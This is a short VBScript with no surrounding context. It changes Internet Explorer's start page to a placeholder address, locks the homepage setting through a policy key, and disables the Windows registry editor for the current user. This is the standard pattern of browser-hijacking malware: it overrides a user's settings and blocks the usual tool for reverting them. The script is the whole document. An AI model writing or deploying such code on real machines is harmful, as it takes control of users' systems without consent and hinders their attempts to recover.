Set shell = CreateObject("WScript.Shell")
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "https://example.invalid/", "REG_SZ"
shell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage", 1, "REG_DWORD"
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
